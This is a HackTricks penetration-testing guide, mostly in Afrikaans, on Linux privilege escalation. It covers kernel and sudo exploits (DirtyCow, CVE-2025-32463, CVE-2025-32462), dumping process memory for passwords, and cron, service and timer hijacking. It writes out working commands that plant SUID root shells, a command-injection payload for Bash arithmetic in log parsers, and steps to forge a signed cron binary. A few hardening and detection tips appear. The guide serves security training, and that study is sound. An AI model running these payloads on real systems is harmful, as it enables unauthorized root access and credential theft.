# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS info

Kom ons begin deur 'n bietjie kennis op te doen oor die OS wat loop
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pad

As jy **skryftoestemmings op enige vouer binne die `PATH`** veranderlike het, kan jy dalk sommige libraries of binaries hijack:
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernelweergawe en of daar ’n exploit is wat gebruik kan word om regte te eskaleer.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan hier ’n goeie kwesbare kernel lys en sommige reeds **compiled exploits** vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel weergawes van daardie web af te onttrek kan jy doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

Soek altyd **die kernel version in Google**, dalk is jou kernel version geskryf in een of ander kernel exploit en dan sal jy seker wees dat hierdie exploit geldig is.

Bykomende kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo weergawe

Gebaseer op die kwesbare sudo-weergawes wat verskyn in:
```bash
searchsploit sudo
```
Jy kan kyk of die sudo weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo weergawes voor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) laat on-geprivilegieerde plaaslike gebruikers toe om hul voorregte na root te verhoog via die sudo `--chroot` opsie wanneer die `/etc/nsswitch.conf` lêer vanaf 'n gebruiker-beheerde gids gebruik word.

Hier is 'n [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) om daardie [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) te eksploit. Voordat jy die exploit laat loop, maak seker dat jou `sudo` weergawe kwesbaar is en dat dit die `chroot` kenmerk ondersteun.

Vir meer inligting, verwys na die oorspronklike [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo voor 1.9.17p1 (gerapporteerde geraakte reeks: **1.8.8–1.9.17**) kan host-based sudoers reëls evalueer deur die **user-supplied hostname** van `sudo -h <host>` te gebruik in plaas van die **real hostname**. As sudoers breër voorregte op 'n ander host toestaan, kan jy daardie host plaaslik **spoof**.

Requirements:
- Kwesbare sudo weergawe
- Host-spesifieke sudoers reëls (host is nóg die huidige hostname nóg `ALL`)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Eksploiteer deur die toegelate host te spoof:
```bash
sudo -h devbox id
sudo -h devbox -i
```
As resolusie van die gespoofde naam blokkeer, voeg dit by `/etc/hosts` of gebruik ’n gasheernaam wat reeds in logs/configs verskyn om DNS-opvragings te vermy.

#### sudo < v1.8.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het misluk

Kyk na **smasher2 box of HTB** vir ’n **voorbeeld** van hoe hierdie vuln uitgebuit kon word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelsel-enumerasie
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Lys moontlike verdediging

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

As jy binne 'n container is, begin met die volgende container-security-afdeling en pivot dan na die runtime-spesifieke abuse-bladsye:


{{#ref}}
container-security/
{{#endref}}

## Drives

Kontroleer **wat gemount en unmounted is**, waar en hoekom. As enigiets unmounted is, kan jy probeer om dit te mount en te kyk vir private info
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Lys nuttige binaries op
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kontroleer ook of **enige compiler geïnstalleer is**. Dit is nuttig as jy ’n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit te kompileer op die masjien waar jy dit gaan gebruik (of op een soortgelyk)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kwesbare Sagteware Geïnstalleer

Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar ’n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om voorregte te verhoog…\
Dit word aanbeveel om die weergawe van die meer verdagte geïnstalleerde sagteware handmatig na te gaan.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om te kyk vir verouderde en kwesbare sagteware wat binne die masjien geïnstalleer is.

> [!NOTE] > _Let daarop dat hierdie opdragte baie inligting sal wys wat meestal nutteloos sal wees; daarom word dit aanbeveel om sommige toepassings soos OpenVAS of soortgelyke te gebruik wat sal nagaan of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Processes

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte het as wat dit behoort** (miskien ’n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Kyk altyd vir moontlike [**electron/cef/chromium debuggers** wat loop nie, jy kan dit misbruik om voorregte te eskaleer](electron-cef-chromium-debugger-abuse.md). **Linpeas** bespeur hulle deur die `--inspect`-parameter binne die command line van die process te kontroleer.\
Kyk ook **na jou privileges oor die processes binaries**, dalk kan jy iemand se binary oorskryf.

### Cross-user parent-child chains

’n Child process wat onder ’n **ander user** as sy parent loop, is nie outomaties kwaadwillig nie, maar dit is ’n nuttige **triage signal**. Sommige oorgange is verwag (`root` wat ’n service user spawn, login managers wat session processes skep), maar ongewone chains kan wrappers, debug helpers, persistence, of swak runtime trust boundaries openbaar.

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
As jy ’n verrassende ketting vind, inspekteer die ouer se opdragreël en al die lêers wat sy gedrag beïnvloed (`config`, `EnvironmentFile`, helper-skripte, werkmap, skryfbare argumente). In verskeie werklike privesc-paaie was die kind self nie skryfbaar nie, maar die **ouer-beheerde config** of helper-ketting was wel.

### Deleted executables and deleted-open files

Runtime artefakte is dikwels steeds toeganklik **ná deletion**. Dit is nuttig vir beide privilege escalation en vir die herstel van evidence uit ’n proses wat reeds sensitiewe lêers oop het.

Kyk vir deleted executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
As `/proc/<PID>/exe` na `(deleted)` wys, loop die proses steeds die ou binêre beeld uit geheue. Dit is ’n sterk sein om te ondersoek omdat:

- die verwyderde uitvoerbare lêer interessante stringe of geloofsbriewe kan bevat
- die lopende proses dalk steeds nuttige lêerdeskriptoren blootstel
- ’n verwyderde bevoorregte binêre onlangse gepeuter of poging tot opruiming kan aandui

Versamel globally deleted-open files:
```bash
lsof +L1
```
As jy ’n interessante descriptor vind, herstel dit direk:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Hierdie is veral waardevol wanneer ’n proses nog ’n deleted secret, script, database export, of flag file oop het.

### Process monitoring

Jy kan tools soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om processes te monitor. Dit kan baie nuttig wees om kwetsbare processes te identifiseer wat gereeld uitgevoer word of wanneer ’n stel vereistes voldoen word.

### Process memory

Sommige services van ’n server stoor **credentials in clear text inside the memory**.\
Normaalweg sal jy **root privileges** nodig hê om die memory van processes te lees wat aan ander users behoort; daarom is dit gewoonlik meer bruikbaar wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **as ’n regular user jy die memory kan lees van die processes wat jy besit**.

> [!WARNING]
> Let daarop dat die meeste machines deesdae **nie ptrace by default toelaat nie**, wat beteken dat jy nie ander processes kan dump wat aan jou unprivileged user behoort nie.
>
> Die file _**/proc/sys/kernel/yama/ptrace_scope**_ beheer die toeganklikheid van ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle processes kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke manier waarop ptracing gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs ’n parent process kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit CAP_SYS_PTRACE capability vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen processes mag met ptrace ge-trace word nie. Sodra dit gestel is, is ’n reboot nodig om ptracing weer te aktiveer.

#### GDB

As jy toegang het tot die memory van byvoorbeeld ’n FTP service, kan jy die Heap uitkry en binne-in sy credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir ’n gegewe proses-ID, **maps wys hoe geheue binne daardie proses se** virtuele adresruimte gemap word; dit wys ook die **toestemmings van elke gemapte streek**. Die **mem** pseudo-lêer **stel die proses se geheue self bloot**. Uit die **maps**-lêer weet ons watter **geheuestreke leesbaar is** en hul offsets. Ons gebruik hierdie inligting om **in die mem-lêer in te seek en al die leesbare streke** na ’n lêer te dump.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` verskaf toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan met /dev/kmem verkry word.\
Tipies is `/dev/mem` slegs leesbaar vir **root** en die **kmem**-groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump is ’n Linux-herverbeelding van die klassieke ProcDump-tool uit die Sysinternals-reeks gereedskap vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Om 'n process memory te dump kan jy gebruik maak van:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_You can manually remove root requirements and dump the process owned by you
- Script A.5 van [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is required)

### Credentials from Process Memory

#### Manual example

As jy vind dat die authenticator process loop:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die proses dump (sien vorige afdelings om verskillende maniere te vind om die geheue van 'n proses te dump) en soek na geloofsbriewe binne die geheue:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die instrument [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **duidelike teks-aanmeldingsbewyse uit geheue steel** en uit sommige **bekende lêers**. Dit vereis root-voorregte om behoorlik te werk.

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

As ’n web “Crontab UI”-paneel (alseambusher/crontab-ui) as root loopback-only gebind is, kan jy dit steeds via SSH local port-forwarding bereik en ’n geprivilegieerde job skep om privilege escalation te doen.

Tipiese ketting
- Ontdek loopback-only port (bv. 127.0.0.1:8000) en Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Vind credentials in operational artifacts:
- Backups/scripts met `zip -P <password>`
- systemd unit wat `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=...""` blootstel
- Tunnel en login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep ’n hoë-priv job en voer dit onmiddellik uit (laat val SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```
Verharding
- Moenie Crontab UI as root laat loop nie; beperk dit met ’n toegewyde gebruiker en minimale regte
- Bind aan localhost en beperk toegang bykomend via firewall/VPN; moenie wagwoorde hergebruik nie
- Vermy die insluit van secrets in unit files; gebruik secret stores of root-only EnvironmentFile
- Aktiveer audit/logging vir on-demand job-uitvoerings



Kyk of enige geskeduleerde job kwesbaar is. Miskien kan jy voordeel trek uit ’n script wat deur root uitgevoer word (wildcard vuln? kan lêers verander wat root gebruik? gebruik symlinks? skep spesifieke lêers in die directory wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
As `run-parts` gebruik word, kontroleer watter name werklik sal uitvoer:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Dit vermy vals positiewe. ’n Skryfbare periodiese gids is slegs nuttig as jou payload-lêernaam ooreenstem met die plaaslike `run-parts` reëls.

### Cron path

Byvoorbeeld, binne _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryftoestemmings oor /home/user het_)

As binne hierdie crontab die root gebruiker probeer om een of ander opdrag of script uit te voer sonder om die path in te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy ’n root shell kry deur te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron met behulp van 'n script met 'n wildcard (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” binne 'n command het, kan jy dit uitbuit om onverwagte dinge te laat gebeur (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur ’n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **is nie).**

Lees die volgende bladsy vir meer wildcard-exploitation truuks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voor arithmetic evaluation in ((...)), $((...)) en let. As ’n root cron/parser onbetroubare log-velde lees en hulle in ’n arithmetic context invoer, kan ’n aanvaller ’n command substitution $(...) inspuit wat as root uitgevoer word wanneer die cron loop.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Kry aanvaler-beheerde teks wat in die geparste log geskryf word sodat die numeries-lykende veld ’n command substitution bevat en met ’n syfer eindig. Maak seker jou command druk niks na stdout nie (of herlei dit) sodat die arithmetic geldig bly.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

As jy **’n cron script kan wysig** wat deur root uitgevoer word, kan jy baie maklik ’n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word ’n **gids gebruik waartoe jy volle toegang het**, kan dit dalk nuttig wees om daardie gids uit te vee en **’n simboolskakelgids na ’n ander een te skep** wat ’n script bedien wat deur jou beheer word.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation and safer file handling

Wanneer bevoorregte scripts/binaries wat lêers volgens pad lees of skryf nagegaan word, verifieer hoe links hanteer word:

- `stat()` volg `n symlink en gee metadata van die teiken terug.
- `lstat()` gee metadata van die link self terug.
- `readlink -f` en `namei -l` help om die finale teiken op te los en wys die permissies van elke padkomponent.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Vir verdedigers/ontwikkelaars sluit veiliger patrone teen symlink-truuks in:

- `O_EXCL` with `O_CREAT`: faal as die pad reeds bestaan (blokkeer aanvaller-voorafgeskepte links/files).
- `openat()`: werk relatief tot ’n vertroude directory file descriptor.
- `mkstemp()`: skep tydelike files atomies met veilige permissions.

### Custom-signed cron binaries with writable payloads
Blue teams “sign” soms cron-gedrewe binaries deur ’n custom ELF section te dump en vir ’n vendor string te grep voor hulle dit as root uitvoer. As daardie binary group-writable is (bv. `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) en jy kan die signing material leak, kan jy die section forge en die cron task hijack:

1. Gebruik `pspy` om die verification flow vas te vang. In Era het root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` laat loop, gevolg deur `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` en toe die file uitgevoer.
2. Recreate die verwagte certificate met die leaked key/config (van `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Bou ’n malicious replacement (bv. drop ’n SUID bash, voeg jou SSH key by) en embed die certificate in `.text_sig` sodat die grep slaag:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Oorskryf die geskeduleerde binary terwyl execute bits behoue bly:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wag vir die volgende cron run; sodra die naive signature check slaag, loop jou payload as root.

### Frequent cron jobs

Jy kan die processes monitor om te soek vir processes wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy voordeel daaruit trek en privileges escalate.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **te sorteer volgens die minste uitgevoerde commands** en die commands te delete wat die meeste uitgevoer is, kan jy doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (this will monitor and list every process that starts).

### Root backups that preserve attacker-set mode bits (pg_basebackup)

If a root-owned cron wraps `pg_basebackup` (or any recursive copy) against a database directory you can write to, you can plant a **SUID/SGID binary** that will be recopied as **root:root** with the same mode bits into the backup output.

Typical discovery flow (as a low-priv DB user):
- Use `pspy` to spot a root cron calling something like `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` every minute.
- Confirm the source cluster (e.g., `/var/lib/postgresql/14/main`) is writable by you and the destination (`/opt/backups/current`) becomes owned by root after the job.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Dit werk omdat `pg_basebackup` lêer-modus-bisse behou wanneer dit die cluster kopieer; wanneer dit deur root uitgevoer word, erf die bestemmingslêers **root-eienaarskap + aanvaller-gekose SUID/SGID**. Enige soortgelyke geprivilegieerde backup/kopie-roetine wat toestemmings behou en in ’n uitvoerbare ligging skryf, is kwesbaar.

### Onsigbare cron jobs

Dit is moontlik om ’n cronjob te skep deur **’n carriage return ná ’n comment te plaas** (sonder newline character), en die cron job sal werk. Voorbeeld (let op die carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Om hierdie soort stealth entry op te spoor, inspekteer cron-lêers met tools wat control characters blootstel:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Kontroleer of jy enige `.service`-lêer kan skryf, as jy kan, **kon jy dit verander** sodat dit jou **backdoor uitvoer wanneer** die service **begin**, **herbegin** of **stop** word (miskien sal jy moet wag totdat die masjien herlaai word).\
Byvoorbeeld, skep jou backdoor binne die .service-lêer met **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Onthou dat as jy **skryftoestemmings oor binaries het wat deur services uitgevoer word**, jy dit kan verander vir backdoors sodat wanneer die services weer uitgevoer word, die backdoors uitgevoer sal word.

### systemd PATH - Relative Paths

Jy kan die PATH wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
As jy vind dat jy in enige van die vouers van die pad kan **skryf**, kan jy dalk **privileges eskaleer**. Jy moet soek vir **relative paths wat op service configuration**-lêers gebruik word soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Dan, skep ’n **uitvoerbare** lêer met **dieselfde naam as die relatiewe pad-binary** binne die systemd PATH-lêergids wat jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie uit te voer (**Start**, **Stop**, **Reload**), sal jou **backdoor uitgevoer** word (onbevoorregte gebruikers kan gewoonlik nie dienste start/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd unit-lêers wie se naam eindig op `**.timer**` wat `**.service**`-lêers of gebeure beheer. **Timers** kan gebruik word as ’n alternatief vir cron aangesien hulle ingeboude ondersteuning het vir kalender-tydgebeure en monotone tydgebeure en asynchroon uitgevoer kan word.

Jy kan al die timers opspoor met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy ’n timer kan wysig, kan jy dit laat sommige bestaande **systemd.unit** laat uitvoer (soos ’n `.service` of ’n `.target`)
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Daarom, om hierdie toestemming te misbruik, sal jy moet:

- Vind een of ander systemd unit (soos `n `.service`) wat `n skryfbare binary uitvoer
- Vind een of ander systemd unit wat `n relatiewe path uitvoer en jy het **skryfbare privileges** oor die **systemd PATH** (om daardie executable na te boots)

**Leer meer oor timers met `man systemd.timer`.**

### **Enabling Timer**

Om `n timer te enable, het jy root privileges nodig en om uit te voer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **geaktiveer** deur ’n symlink daarna te skep op `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) maak **process communication** op dieselfde of verskillende masjiene binne client-server models moontlik. Hulle gebruik standaard Unix descriptor files vir inter-computer communication en word via `.socket` files opgestel.

Sockets kan met `.socket` files gekonfigureer word.

**Learn more about sockets with `man systemd.socket`.** Binne hierdie file kan verskeie interessante parameters gekonfigureer word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie options is verskillend, maar ’n summary word gebruik om aan te dui waar dit gaan luister na die socket (die path van die AF_UNIX socket file, die IPv4/6 en/of port number om na te luister, ens.)
